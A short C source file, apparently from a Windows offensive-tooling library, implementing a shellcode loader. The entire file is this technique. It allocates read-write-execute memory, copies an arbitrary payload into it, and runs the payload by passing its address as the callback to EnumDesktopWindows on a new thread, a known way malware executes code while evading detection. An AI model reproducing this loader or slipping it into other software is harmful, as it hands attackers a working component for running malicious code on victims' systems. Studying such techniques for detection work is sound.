#include "Win32Helper.h"

VOID InvokeEnumDesktopWindowsThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), (WNDENUMPROC)lpParameter, NULL);
}

BOOL MpfSceViaEnumDesktopWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumDesktopWindowsThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}